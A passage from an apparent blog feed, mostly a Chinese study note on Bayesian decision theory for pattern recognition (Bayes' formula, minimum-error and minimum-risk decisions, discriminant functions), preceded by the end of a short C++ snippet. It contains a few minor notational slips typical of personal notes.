<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> a = (<span class="number">10086</span>) <span class="built_in">and</span> (<span class="number">1024</span>);</span><br><span class="line">  std::cout &lt;&lt; a &lt;&lt; std::endl;</span><br><span class="line">  <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>note</tag>
        <tag>c</tag>
        <tag>c++</tag>
      </tags>
  </entry>
  <entry>
    <title>模式识别-贝叶斯决策论笔记</title>
    <url>//bayesian-decision-theory.html</url>
    <content><![CDATA[<h1 id="模式识别">模式识别</h1>
<h2 id="贝叶斯决策论">贝叶斯决策论</h2>
<h3 id="公式">公式</h3>
<p>贝叶斯概率是由贝叶斯提出的一种“逆概”的概念，计算正向概率的方法对于当时的人们而言是十分轻易的，例如“假设容器中有N个白球，M个黑球，随机抽取一个球，抽取的是白球的概率是多少”。但一个自然而然的问题是与正向概率相反的，例如“随机抽取一个（多个）球，知道了抽取的概率，那么容器内黑白球的比例是多少”。</p>
<p>这个问题是现实的，因为往往人们对一个事件进行评价的时候，无法掌握因，而只能知晓果，由果推因是人们常做的事情。</p>
<h4 id="条件概率">条件概率</h4>
<p>要理解<strong>贝叶斯公式</strong>首先需要了解<strong>条件概率</strong>，定义
<span class="math inline">\(P(A|B)\)</span> 为在事件 <span class="math inline">\(B\)</span> 发生后，事件 <span class="math inline">\(A\)</span> 发生的概率。</p>
<p>条件概率公式： <span class="math display">\[
P(A|B)=\frac{P(AB)}{P(B)}
\]</span> 其中 <span class="math inline">\(P(A|B)\)</span>
是条件概率，<span class="math inline">\(P(AB)\)</span>
是两个事件共同发生的概率，<span class="math inline">\(P(B)\)</span>
是事件 <span class="math inline">\(B\)</span>
作为独立事件单独发生的概率。</p>
<p>例如掷骰子，掷出3点以上的概率为 <span class="math inline">\(P(\text{掷出3点以上})=1/2\)</span>，而掷出3点以上又为偶数的概率为
<span class="math inline">\(P(\text{掷出3点以上又为偶数})=1/3\)</span>，那么我们可以计算得到已经掷出3点以上后，点数为偶数的概率为
<span class="math display">\[
P(\text{掷出3点以上}|\text{点数为偶数})=\frac{P(\text{掷出3点以上又为偶数})}{P(\text{掷出3点以上})}=2/3
\]</span> 显然，符合我们通过古典概型计算得到的结果。</p>
<h4 id="概率密度函数">概率密度函数</h4>
<p>定义连续型随机变量的概率密度为 <span class="math display">\[
F(x)=\int^\infty_{-\infty}f(t)\mathrm{d}t
\]</span> 其中 <span class="math inline">\(F(x)\)</span> 为随机变量
<span class="math inline">\(X\)</span> 的<strong>分布函数</strong>，则称
<span class="math inline">\(f(x)\)</span> 为 <span class="math inline">\(X\)</span>
的<strong>概率密度函数</strong>，简称<strong>概率密度</strong>或<strong>密度函数</strong>。</p>
<p>而分布函数的定义为 <span class="math display">\[
F(\xi)=P(X&lt;\xi)
\]</span> 反之有 <span class="math display">\[
f(x)=\frac{\mathrm{d}F(x)}{\mathrm{d}x}
\]</span></p>
<h4 id="全概率公式">全概率公式</h4>
<p><span class="math display">\[
P(B)=P(B|A)P(A)+P(B|\bar{A})P(\bar{A})
\]</span></p>
<p>用于求贝叶斯公式中的无条件概率 <span class="math inline">\(P(B)\)</span>，其中事件 <span class="math inline">\(\bar{A}\)</span> 代表事件 <span class="math inline">\(A\)</span> 不发生。</p>
<p>完整公式有 <span class="math display">\[
\begin{align*}
P(B)&amp;=P(BA_1)+P(BA_2)+\cdots+P(BA_n)\\
&amp;=P(B|A_{1}) P(A_{1})+P(B|A_{2})P(A_{2})+\cdots+P(B|A_{n})P(A_{n})\\
&amp;=\sum^n_{i=1}P(A_i)P(B|A_i)
\end{align*}
\]</span></p>
<h4 id="贝叶斯公式">贝叶斯公式</h4>
<p>通过条件概率公式变形，可以得到 <span class="math display">\[
P(AB)=P(A)P(B|A)=P(B)P(A|B)
\]</span> 整理可得贝叶斯公式 <span class="math display">\[
P(A|B)=P(A)\frac{P(B|A)}{P(B)}
\]</span> 其中我们把 <span class="math inline">\(P(A)\)</span>
称作<strong>先验概率</strong>，即事件 <span class="math inline">\(A\)</span>
发生的概率，称为<strong>先验</strong>是因为该概率并不考虑事件 <span class="math inline">\(B\)</span> 的影响，即在事件 <span class="math inline">\(B\)</span> 发生前，对事件 <span class="math inline">\(A\)</span> 概率的一个评估。</p>
<p><span class="math inline">\(P(A|B)\)</span>
称作<strong>后验概率</strong>，即事件 <span class="math inline">\(B\)</span> 发生后，事件 <span class="math inline">\(A\)</span> 发生的概率，也是对事件 <span class="math inline">\(A\)</span> 概率的重新评估。</p>
<p>而因子 <span class="math inline">\(P(B|A)/P(B)\)</span>
称作<strong>可能性函数</strong>（likelihood），也是一个<strong>调整因子</strong>，使得预估概率更加接近真实概率。（<span class="math inline">\(P(B)\)</span> 也称作证据概率（evidence
probability））</p>
<blockquote>
<p><span class="math inline">\(P(B)\)</span> 可用全概率公式求解。</p>
</blockquote>
<p>故贝叶斯公式可以表达为：**后验概率=先验概率*可能性函数**</p>
<p>根据<strong>可能性函数</strong>的公式，我们可以知道：</p>
<blockquote>
<p>当“<strong>可能性函数</strong>&gt;1”时，<strong>先验概率</strong>被增强，事件
<span class="math inline">\(A\)</span> 发生的概率增大；</p>
<p>当“<strong>可能性函数</strong>=1”时，意味着事件 <span class="math inline">\(B\)</span> 无助于判断事件 <span class="math inline">\(A\)</span> 发生的概率；</p>
<p>当“<strong>可能性函数</strong>&lt;1”时，<strong>先验概率</strong>被削弱，事件
<span class="math inline">\(A\)</span> 发生的概率减小。</p>
</blockquote>
<p>贝叶斯公式的意义在于帮助我们在有限信息的情况下，尽量得到客观概率的近似值（先验概率由我们主观估计，通过可能性函数进行修正我们的先验概率得到后验概率，即客观概率的近似值）。</p>
<h4 id="实际应用">实际应用</h4>
<p>已知两个一模一样的容器，容器 <span class="math inline">\(A_1\)</span>
中有 30 个白球和 10 个黑球，而容器 <span class="math inline">\(A_2\)</span> 中有 20 个白球和 20
个黑球，现在从中随机摸出一个球是白球，请问这个白球来自一号容器的概率是多少？</p>
<p>我们可以列出下面一个表：</p>
<table>
<thead>
<tr class="header">
<th>容器/分类</th>
<th><span class="math inline">\(A_1\)</span></th>
<th><span class="math inline">\(A_2\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>白球</td>
<td>30</td>
<td>20</td>
</tr>
<tr class="even">
<td>黑球</td>
<td>10</td>
<td>20</td>
</tr>
</tbody>
</table>
<p>可以知道先验概率 <span class="math inline">\(P(A_1)=P(A_2)=0.5\)</span>（不受摸出来的球的影响下，球来自哪个容器的概率）</p>
<p>假定事件 <span class="math inline">\(B\)</span> 为摸出白球，有 <span class="math inline">\(P(B)=(30+20)/80=5/8\)</span></p>
<p>而已知在容器 <span class="math inline">\(A_1\)</span>
中摸出白球的概率为 <span class="math inline">\(P(B|A_1)=30/40=3/4\)</span></p>
<p>那么我们要求的后验概率 <span class="math inline">\(P(A_1|B)=P(A_1)P(B|A_1)/P(B)=3/5\)</span>，即在抽取的球为白球时，球来自容器
<span class="math inline">\(A_1\)</span> 的概率为 0.6。</p>
<p>其中可能性函数 <span class="math inline">\(P(B|A_1)/P(B)=1.2\)</span>，即先验概率<strong>被增强</strong>了。</p>
<p>举个更具体的例子，因为艾滋病潜伏期很长，所以即便感染了也可能在很长的一段时间，身体没有任何感觉，所以艾滋病检测的假阳性会导致被测人非常大的心理压力。</p>
<p><strong>你可能会觉得，检测准确率都99%了，误测几乎可以忽略不计了吧？所以你觉得这人肯定没有患艾滋病了对不对？</strong></p>
<p>让我们用贝叶斯定理算一下，就会发现你的直觉是错误的。</p>
<p>假设某种疾病的发病率是0.001，即1000人中会有1个人得病。现在有一种试剂可以检验患者是否得病，它的准确率是0.99，即在患者确实得病的情况下，它有99%的可能呈现阳性。它的误报率是5%，即在患者没有得病的情况下，它有5%的可能呈现阳性。</p>
<p>现在有一个病人的检验结果为阳性，请问他确实得病的可能性有多大？</p>
<p>病人的检验结果为阳性（新的信息）记为事件 <span class="math inline">\(B\)</span>，他得病记为事件 <span class="math inline">\(A\)</span>。</p>
<p>那么要求的问题就是 <span class="math inline">\(P(A|B)\)</span>，也就是病人的检验结果为阳性 <span class="math inline">\(P(B)\)</span>，他确实得病的概率 <span class="math inline">\(P(A)\)</span>。</p>
<p>已知信息为这种疾病的发病率是 0.001，即 <span class="math inline">\(P(A)=0.001\)</span></p>
<p>试剂可以检验患者是否得病，准确率是
0.99，也就是在患者确实得病的情况下<span class="math inline">\(P(A)\)</span>，它有 99% 的可能呈现阳性 <span class="math inline">\(P(B)\)</span>，所以 <span class="math inline">\(P(B|A)=0.99\)</span></p>
<p>试剂的误报率是 5%，即在患者没有得病的情况下，它有 5%
的可能呈现阳性。得病我们记为事件 <span class="math inline">\(A\)</span>，那么没有得病就是事件 <span class="math inline">\(A\)</span> 的反面，记为 <span class="math inline">\(\bar{A}\)</span>，所以这句话就可以表示为 <span class="math inline">\(P(B|\bar{A})=0.05\)</span></p>
<p>可能性函数为 <span class="math inline">\(P(B|A)/P(B)=19.4346\)</span>，可以知道先验概率被增强，得到后验概率为
<span class="math inline">\(P(A|B)=0.0194\)</span>，即筛查的准确率都到了
99% 了，通过体检结果有病（阳性）确实得病的概率也只有 1.94%。</p>
<p>由于发艾滋病实在是小概率事件，所以当我们对一大群人做艾滋病筛查时，虽说准确率有
99%，但仍然会有相当一部分人因为误测而被诊断为艾滋病，这一部分人在人群中的数目甚至比真正艾滋病患者的数目还要高。</p>
<p>造成这么不靠谱的误诊的原因，是无差别地给一大群人做筛查，而不论测量准确率有多高，因为正常人的数目远大于实际的患者，所以误测造成的干扰就非常大了。</p>
<p>根据贝叶斯定理，我们知道提高先验概率，可以有效的提高后验概率。</p>
<p>所以解决的办法倒也很简单，就是先锁定可疑的人群，比如10000人中检查出现问题的那10个人，再独立重复检测一次。因为正常人连续两次体检都出现误测的概率极低，这时筛选出真正患者的准确率就很高了，这也是为什么许多疾病的检测，往往还要送交独立机构多次检查的原因。</p>
<p>这也是为什么艾滋病检测第一次呈阳性的人，还需要做第二次检测，第二次依然是阳性的还需要送交国家实验室做第三次检测。</p>
<h3 id="决策论">决策论</h3>
<h4 id="定义">定义</h4>
<p>我们首先定义 <span class="math inline">\(\boldsymbol{x}\)</span>
为<strong>特征向量</strong>，假定 <span class="math inline">\(\boldsymbol{x}\)</span>
是一个连续随机变量，其分布取决于类别状态，表示为 <span class="math inline">\(p(\boldsymbol{x}|\omega)\)</span>，将该概率密度函数称作<strong>类条件概率密度</strong>（class-conditional
probability），即<strong>类别状态为 <span class="math inline">\(\omega\)</span> 时 <span class="math inline">\(\boldsymbol{x}\)</span>
的概率密度函数</strong>，又叫做<strong>似然</strong>（likelihood）。通俗理解为<strong>分类作为概率密度函数的条件</strong>。</p>
<p>其中 <span class="math inline">\(p(\boldsymbol{x})\)</span>
为<strong>证据概率</strong>（evidence probability），<span class="math inline">\(P(\omega_i|\boldsymbol{x})\)</span>
为<strong>后验概率</strong>（posterior probability），而 <span class="math inline">\(P(\omega_i)\)</span>
为<strong>先验概率</strong>（prior probability）。</p>
<h4 id="贝叶斯分类">贝叶斯分类</h4>
<p>对一个模式（pattern）进行分类，只根据<strong>先验概率</strong>进行决策是不现实的，这会导致分类永远只有一个结果。</p>
<p>例如取 <span class="math inline">\(\omega_1,\omega_2\)</span>
为鲈鱼和鲑鱼，可知鲑鱼要比鲈鱼稀有，仅从客观概率上来说，<span class="math inline">\(P(\omega_1)&gt;P(\omega_2)\)</span>，此时无论如何判决都会选取
<span class="math inline">\(\omega_1\)</span> 而非 <span class="math inline">\(\omega_2\)</span>。</p>
<p>为了更好的分类，我们需要引入模式的特征（feature），结合特征进行分类。</p>
<p>而贝叶斯分类就是结合特征和贝叶斯概率的结果进行决策。</p>
<p>根据贝叶斯公式： <span class="math display">\[
P(\omega_j|\boldsymbol{x})=\frac{p(\boldsymbol{x}|\omega_j)P(\omega_j)}{p(\boldsymbol{x})}
\]</span> 我们可以通过观测 <span class="math inline">\(\boldsymbol{x}\)</span> 的值将先验概率 <span class="math inline">\(P(\omega_j)\)</span>
转化为后验概率，即假设特征向量已知的条件下，类别为 <span class="math inline">\(\omega_j\)</span> 的概率。</p>
<p>其中 <span class="math inline">\(p(\boldsymbol{x})\)</span> 和 <span class="math inline">\(p(\boldsymbol{x}|\omega_j)\)</span>
是可以通过已知的部分信息学习得知的。</p>
<p>例如取特征向量 <span class="math inline">\(\boldsymbol{x}\)</span>
为鱼的长度，我们可以通过样本（sample）计算其长度总的出现频率（证据概率密度，或者也可以使用全概率公式求解）和在类别为
<span class="math inline">\(\omega_1,\omega_2\)</span>
时长度的出现频率（类条件概率密度）。</p>
<figure>
<img src="/bayesian-decision-theory/类条件概率密度.png" alt="类条件概率密度">
<figcaption aria-hidden="true">类条件概率密度</figcaption>
</figure>
<p>此时我们的判决规则为：</p>
<p>如果 <span class="math display">\[
P(\omega_1|\boldsymbol{x})&gt;P(\omega_2|\boldsymbol{x})
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<p>正如贝叶斯概率的核心思想，我们通过先验概率（主观判断或客观事实）和已知信息（果或者似然）计算得到了后验概率（因或逆概）。</p>
<blockquote>
<p>需要分清的是，<span class="math inline">\(p(\boldsymbol{x}|\omega_j)\)</span>
是训练/学习（training/learning）计算得到的，而 <span class="math inline">\(P(\omega_j|\boldsymbol{x})\)</span>
是用来预测（predict）的，在模式识别中是两个阶段。</p>
</blockquote>
<h4 id="连续特征下的决策论">连续特征下的决策论</h4>
<p>将以上想法进一步正式化，推广为如下 4 种形式：</p>
<ul>
<li>允许使用多于一个的特征</li>
<li>允许多余两种类别状态的情形</li>
<li>允许有其他行为而不仅仅是判定类别</li>
</ul>
<p>其中，我们定义：</p>
<ul>
<li>特征使用特征向量 <span class="math inline">\(\boldsymbol{x}\)</span>
来描述多个特征</li>
<li>集合 <span class="math inline">\(\Omega=\{\omega_1,\omega_2\,\cdots,\omega_c\}\)</span>
为有限的 <span class="math inline">\(c\)</span> 个类别（state）集合</li>
<li>集合 <span class="math inline">\(A=\{\alpha_1,\alpha_2,\cdots,\alpha_a\}\)</span>
为有限的 <span class="math inline">\(a\)</span>
个可能的行动（action）集合</li>
</ul>
<p>我们已知 <span class="math display">\[
P(\omega_j|\boldsymbol{x})=\frac{p(\boldsymbol{x}|\omega_j)P(\omega_j)}{p(\boldsymbol{x})}
\]</span> 此时证据因子 <span class="math inline">\(p(\boldsymbol{x})\)</span> 为 <span class="math display">\[
p(\boldsymbol{x})=\sum^c_{j=1}p(\boldsymbol{x}|\omega_j)P(\omega_j)
\]</span> 对于简单化判决而言，判决规则是一个函数 <span class="math inline">\(\alpha(\boldsymbol{x})\)</span>，值域为集合 <span class="math inline">\(\Omega\)</span>。</p>
<h4 id="最小误差概率决策">最小误差概率决策</h4>
<p>对于二分类问题，如果有某个观测值使得 <span class="math inline">\(P(\omega_1|\boldsymbol{x})&gt;P(\omega_2|\boldsymbol{x})\)</span>，那么我们自然的可以判断该模式来自于分类
<span class="math inline">\(\omega_1\)</span>。</p>
<p>例如说，当先验概率 <span class="math inline">\(P(\omega_1)=2/3,P(\omega_2)=1/3\)</span>，则后验概率
<span class="math inline">\(P(\omega_1 | \boldsymbol{x})\)</span> 和
<span class="math inline">\(P(\omega_2|\boldsymbol{x})\)</span>
如图所示</p>
<figure>
<img src="/bayesian-decision-theory/类条件概率密度.jpg" alt="类条件概率密度">
<figcaption aria-hidden="true">类条件概率密度</figcaption>
</figure>
<p>此时假定一个模式具有特征值 <span class="math inline">\(x=14\)</span>，那么它属于 <span class="math inline">\(\omega_2\)</span> 类的概率约为 0.08，属于 <span class="math inline">\(\omega_1\)</span> 类的概率约为
0.92，在此次后验概率之和为
1.0，此时为<strong>最小化误差概率</strong>，故选择此模式属于 <span class="math inline">\(\omega_1\)</span>。</p>
<p>同时该决策下的误差概率为： <span class="math display">\[
P(error|\boldsymbol{x})=1-P(\omega_1|\boldsymbol{x})
\]</span> 即有： <span class="math display">\[
P(error|\boldsymbol{x})=\begin{cases}
P(\omega_1|\boldsymbol{x})\text{,choose }\omega_2\\
P(\omega_2|\boldsymbol{x})\text{,choose }\omega_1
\end{cases}
\]</span> 可以验证，这种规则将平均误差概率最小化。</p>
<blockquote>
<p>平均误差概率表示为 <span class="math display">\[
P(error)=\int_{-\infty}^{\infty} P(error,x)\mathrm{d}
x=\int_{-\infty}^{\infty} P(error|x) p(x)\mathrm{d}x
\]</span></p>
</blockquote>
<p>上述决策等价于，</p>
<p>若 <span class="math inline">\(P(\boldsymbol{x}|\omega_1)P(\omega_1)&gt;P(\boldsymbol{x}|\omega_2)P(\omega_2)\)</span>，则决策为
<span class="math inline">\(\boldsymbol{x}\in\omega_1\)</span>；</p>
<p>若 <span class="math inline">\(P(\boldsymbol{x}|\omega_1)P(\omega_1)&lt;P(\boldsymbol{x}|\omega_2)P(\omega_2)\)</span>，则决策为
<span class="math inline">\(\boldsymbol{x}\in\omega_2\)</span>。</p>
<p>即 <span class="math display">\[
\frac{P(\boldsymbol{x}|\omega_1)}{P(\boldsymbol{x}|\omega_2)}&gt;\frac{P(\omega_2)}{P(\omega_1)}
\]</span> 判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<blockquote>
<p>其中， <span class="math display">\[
\frac{P(\boldsymbol{x}|\omega_1)}{P(\boldsymbol{x}|\omega_2)}
\]</span> 称作<strong>似然比</strong>。</p>
</blockquote>
<p>实例如下</p>
<blockquote>
<p>某地区细胞识别中正常（<span class="math inline">\(\omega_1\)</span>）和异常（<span class="math inline">\(\omega_2\)</span>）两类的先验概率为 <span class="math inline">\(P(\omega_1)=0.9,P(\omega_2)=0.1\)</span>，且知道两类的类概率密度函数
<span class="math inline">\(p(x|\omega_1),p(x|\omega_2)\)</span>。</p>
<p>先有一细胞特征值为 <span class="math inline">\(x\)</span>，查询类概率密度函数曲线有 <span class="math inline">\(P(x|\omega_1)=0.2,P(x|\omega_1)=0.4\)</span>。</p>
<p>采用最小误差概率决策，得到 <span class="math display">\[
P(x|\omega_1)/P(x|\omega_2)=1/2\\
P(\omega_2)/P(\omega_1)=1/9
\]</span> 显然似然比大于先验概率反比，故判决为 <span class="math inline">\(x\in \omega_1\)</span>，为正常细胞。</p>
</blockquote>
<h4 id="最小风险损失决策">最小风险（损失）决策</h4>
<p>基于最小误差概率的贝叶斯决策，仅考虑了最小化错误概率，未考虑决策所带来的损失，这是与实际应用不相符的，例如灭火系统、乙肝诊断等，总会存在一定的误判损失。</p>
<p>所以我们需要<strong>引入一个更一般的风险函数（loss
function）来替代误差概率</strong>。</p>
<p>定义风险函数 <span class="math inline">\(\lambda(\alpha_i|\omega_j)\)</span> 描述类别状态为
<span class="math inline">\(\omega_j\)</span> 时，采取行动 <span class="math inline">\(\alpha_i\)</span> 的风险（对风险的一个评估）。</p>
<blockquote>
<p>或称为损失函数。</p>
</blockquote>
<p>定义总风险 <span class="math inline">\(R\)</span>
是与某一给定的判决规则相关的预期损失，且 <span class="math inline">\(R(\alpha_i|\boldsymbol{x})\)</span> 是和行动 <span class="math inline">\(\alpha_i\)</span> 相关的条件风险，总风险则表示为
<span class="math display">\[
R=\int
R(\alpha(\boldsymbol{x})|\boldsymbol{x})p(\boldsymbol{x})\mathrm{d}\boldsymbol{x}
\]</span></p>
<blockquote>
<p><span class="math inline">\(\mathrm{d}\boldsymbol{x}\)</span>
说明积分是在整个特征空间进行的。</p>
</blockquote>
<p>可知，如果使得 <span class="math inline">\(R(\alpha_i|\boldsymbol{x})\)</span> 对每个 <span class="math inline">\(\boldsymbol{x}\)</span> 尽可能小，那么总风险 <span class="math inline">\(R\)</span> 将被最小化。</p>
<p>故为了<strong>最小化总风险</strong>，对行动集合 <span class="math inline">\(A\)</span> 计算条件风险 <span class="math display">\[
R(\alpha_i|\boldsymbol{x})=\sum^c_{j=1}\lambda(\alpha_i|\omega_j)P(\omega_j|\boldsymbol{x})
\]</span> 并选择行动 <span class="math inline">\(\alpha_i\)</span> 使得
<span class="math inline">\(R(\alpha_i|\boldsymbol{x})\)</span>
最小化。</p>
<p>最小化后的总风险值称为<strong>贝叶斯风险</strong>，记作 <span class="math inline">\(R^*\)</span>。</p>
<p>对于二分类问题，可以将条件风险简化为 <span class="math display">\[
R(\alpha_1|\boldsymbol{x})=\lambda_{11}P(\omega_1|\boldsymbol{x})+\lambda_{12}P(\omega_2|\boldsymbol{x})\\
R(\alpha_2|\boldsymbol{x})=\lambda_{21}P(\omega_1|\boldsymbol{x})+\lambda_{22}P(\omega_2|\boldsymbol{x})
\]</span></p>
<blockquote>
<p><span class="math inline">\(\lambda_{ij}\)</span> 为简记 <span class="math inline">\(\lambda(\alpha_i|\omega_j)\)</span></p>
</blockquote>
<p>判别的基本规则为当 <span class="math inline">\(R(\alpha_1|\boldsymbol{x})&lt;R(\alpha_2|\boldsymbol{x})\)</span>
时，则判为 <span class="math inline">\(\omega_1\)</span>（描述为当决策为
<span class="math inline">\(\omega_1\)</span> 的损失小于决策为 <span class="math inline">\(\omega_2\)</span> 的损失时，判别为 <span class="math inline">\(\omega_1\)</span>）。</p>
<p>化简为<strong>用后验概率的形式描述该公式</strong>：</p>
<p>如果 <span class="math display">\[
(\lambda_{21}-\lambda_{11})P(\omega_1|\boldsymbol{x})&gt;(\lambda_{12}-\lambda_{22})P(\omega_2|\boldsymbol{x})
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<p>利用贝叶斯公式，改为<strong>用先验概率描述规则</strong>，则变更为：</p>
<p>如果 <span class="math display">\[
(\lambda_{21}-\lambda_{11})p(\boldsymbol{x}|\omega_1)P(\omega_1)&gt;(\lambda_{12}-\lambda_{22})p(\boldsymbol{x}|\omega_2)P(\omega_2)
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<p>另一种表示方式是，合理假设 <span class="math inline">\(\lambda_{21}&gt;\lambda_{11}\)</span>
的条件下：</p>
<p>如果 <span class="math display">\[
\frac{p(\boldsymbol{x}|\omega_1)}{p(\boldsymbol{x}|\omega_2)}&gt;\frac{\lambda_{12}-\lambda_{22}}{\lambda_{21}-\lambda_{11}}\frac{P(\omega_2)}{P(\omega_1)}
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<blockquote>
<p>左式即为似然比。</p>
</blockquote>
<p>这种判决规则的优势是，只依赖于 <span class="math inline">\(\boldsymbol{x}\)</span> 的概率密度。</p>
<p>作出似然比函数，可以得知该种决策的判别边界与右式相关，当似然比大于判别边界时，判决为
<span class="math inline">\(\omega_1\)</span>。</p>
<figure>
<img src="/bayesian-decision-theory/最小风险决策.jpg" alt="最小风险决策">
<figcaption aria-hidden="true">最小风险决策</figcaption>
</figure>
<p>为方便判决，如上图，会选取一个阈值 <span class="math inline">\(\theta_m\)</span> 使得 <span class="math display">\[
\frac{p(\boldsymbol{x}|\omega_1)}{p(\boldsymbol{x}|\omega_2)}&gt;\frac{\lambda_{12}-\lambda_{22}}{\lambda_{21}-\lambda_{11}}\frac{P(\omega_2)}{P(\omega_1)}&gt;\theta_m
\]</span> 即为判决边界，如图虚线所示。</p>
<p>同时由公式可知，当 <span class="math inline">\(\lambda_{12}-\lambda_{22}=\lambda_{21}-\lambda_{11}\)</span>
时，无论选择最小误差概率决策还是最小风险决策都是<strong>等价</strong>的。</p>
<p>实例如下</p>
<blockquote>
<p>同最小误差概率决策中的实例，但此时给出损失表如下</p>
<figure>
<img src="/bayesian-decision-theory/损失表.jpg" alt="损失表">
<figcaption aria-hidden="true">损失表</figcaption>
</figure>
<p>似然比为 0.5，计算损失比 <span class="math display">\[
\frac{\lambda_{12}-\lambda_{22}}{\lambda_{21}-\lambda_{11}}=5
\]</span> 显然 <span class="math display">\[
\frac{1}{2}&lt;5\times\frac{1}{9}
\]</span> 此时如果判决为 <span class="math inline">\(\omega_1\)</span>
风险（损失）更大，故此时判决为 <span class="math inline">\(x\in
\omega_2\)</span>，为异常细胞。</p>
</blockquote>
<h4 id="最小误差率决策">最小误差率决策</h4>
<p>如果要避免误判，自然要寻找一种判决规则使误判概率（即<strong>误差率</strong>）最小化。</p>
<p>这种情况下的损失函数就是所谓的“对称损失”或者“0-1 损失”函数： <span class="math display">\[
\lambda(\alpha_i|\omega_j)=\begin{cases}
0,i=j\\
1,i\neq j
\end{cases}
\]</span> 其中要求 <span class="math inline">\(1&lt;i,j&lt;c\)</span>。</p>
<p>从此简化模型可知，所有误判都是等代价的。</p>
<p>这个损失函数对应的<strong>条件风险</strong>就是<strong>平均误差概率</strong>，它的条件风险为：
<span class="math display">\[
\begin{align}
R(\alpha_i|\boldsymbol{x})&amp;=\sum^c_{j=1}\lambda(\alpha_i|\omega_j)P(\omega_j|\boldsymbol{x})\\
&amp;=\sum_{i\neq j}P(\omega_j|\boldsymbol{x})\\
&amp;=1-P(\omega_i|\boldsymbol{x})
\end{align}
\]</span> 其中 <span class="math inline">\(P(\omega_i|\boldsymbol{x})\)</span> 是行为 <span class="math inline">\(\alpha_i\)</span> 分类正确的条件概率。</p>
<p>这种情况下我们想<strong>最小化平均误差概率</strong>只要选取 <span class="math inline">\(i\)</span> 使得后验概率 <span class="math inline">\(P(\omega_i|\boldsymbol{x})\)</span> 最大即可。</p>
<blockquote>
<p>或者说是<strong>最大化后验概率</strong>。</p>
</blockquote>
<p>即有决策规则，对于任意 <span class="math inline">\(j\neq
i\)</span>，满足 <span class="math display">\[
P(\omega_1|\boldsymbol{x})&gt;P(\omega_j|\boldsymbol{x})
\]</span> 则判决为 <span class="math inline">\(\omega_1\)</span>。</p>
<h4 id="实际应用-1">实际应用</h4>
<p>某人前往中高风险地区为特征 <span class="math inline">\(x\)</span>，有表</p>
<table>
<colgroup>
<col style="width: 22%">
<col style="width: 29%">
<col style="width: 22%">
<col style="width: 25%">
</colgroup>
<thead>
<tr class="header">
<th>分类</th>
<th><span class="math inline">\(\alpha_1=\text{主动上报，自我隔离}\)</span></th>
<th><span class="math inline">\(\alpha_2=\text{做核酸检测}\)</span></th>
<th><span class="math inline">\(\alpha_1=\text{不上报，不做为}\)</span></th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><span class="math inline">\(\omega_1=\text{感染新冠}\)</span></td>
<td>5</td>
<td>50</td>
<td>10000</td>
</tr>
<tr class="even">
<td><span class="math inline">\(\omega_2=\text{未感染新冠}\)</span></td>
<td>60</td>
<td>3</td>
<td>0</td>
</tr>
</tbody>
</table>
<p>知道 <span class="math inline">\(P(\omega_1|x)=0.01\)</span>，<span class="math inline">\(P(\omega_2|x)=0.99\)</span></p>
<p>可以计算 <span class="math display">\[
\begin{align}
R(\alpha_1|x)&amp;=\sum^2_{j=1}\lambda_{1j}P(\omega_j|x)\\
&amp;=\lambda_{11}P(\omega_1|x)+\lambda_{12}P(\omega_2|x)\\
&amp;=5\times0.01+60\times0.99\\
&amp;=59.45\\
R(\alpha_2|x)&amp;=3.47\\
R(\alpha_3|x)&amp;=100\\
\end{align}
\]</span>
故可以得知，前往高风险地区时应采取的决策是做核酸（因为做核酸所导致的损失最低）。</p>
<h3 id="分类器判别函数与判别区域">分类器、判别函数与判别区域</h3>
<h4 id="判别函数">判别函数</h4>
<p>用后验概率与风险函数决策的方式，被称为<strong>模式分类器</strong>，有很多种方式来表示模式分类器，其中用的最多的是使用<strong>判别函数</strong>
<span class="math inline">\(g(\boldsymbol{x})\)</span>。</p>
<blockquote>
<p>使用单增函数嵌套的判决结果不变，即 <span class="math inline">\(f(g(\boldsymbol{x}))\)</span> 对判决无影响，其中
<span class="math inline">\(f(\boldsymbol{x})\)</span> 为单增函数</p>
</blockquote>
<p>如果对于定 <span class="math inline">\(i\)</span> 有任意的 <span class="math inline">\(j\)</span> 满足 <span class="math display">\[
g_i(\boldsymbol{x})&gt;g_j(\boldsymbol{x})
\]</span> 那么判决为 <span class="math inline">\(\omega_i\)</span>。</p>
<p>此分类器可视为一个<strong>计算 <span class="math inline">\(c\)</span>
个判别函数并选取最大判别值对应的类型</strong>的网络。</p>
<figure>
<img src="/bayesian-decision-theory/判别网络.png" alt="判别网络">
<figcaption aria-hidden="true">判别网络</figcaption>
</figure>
<p>简单的判别函数可以表示为后验概率或者条件风险的负值，这样能让判别函数与最小的条件风险对应，判别函数的选择不是唯一的。</p>
<p>以下是常用的<strong>最小误差概率决策判别函数</strong>： <span class="math display">\[
g_i(x)=P(\omega_i|\boldsymbol{x})\\
g_i(x)=p(\boldsymbol{x}|\omega_i)P(\omega_i)\\
g_i(x)=\ln p(\boldsymbol{x}|\omega_i)+\ln P(\omega_i)
\]</span> 还有<strong>最小风险决策判别函数</strong>： <span class="math display">\[
g_i(x)=-R(\alpha_i|\boldsymbol{x})
\]</span> 判决规则是相同的，每种判决规则均是将特征空间分成 <span class="math inline">\(c\)</span> 个判决区域，<span class="math inline">\(R_1,R_2,\cdots,R_c\)</span>。</p>
<p>如果对于所有的 <span class="math inline">\(j\neq i\)</span> 有 <span class="math inline">\(g_i(\boldsymbol{x})&gt;g_j(\boldsymbol{x})\)</span>，那么
<span class="math inline">\(\boldsymbol{x}_i\)</span> 属于 <span class="math inline">\(R_i\)</span>。</p>
<p>此时该区域由判决边界来分割，其判决边界即判决空间中使判别函数值最大的曲面。</p>
<figure>
<img src="/bayesian-decision-theory/判决区域.png" alt="判决区域">
<figcaption aria-hidden="true">判决区域</figcaption>
</figure>
<h4 id="二类分类器">二类分类器</h4>
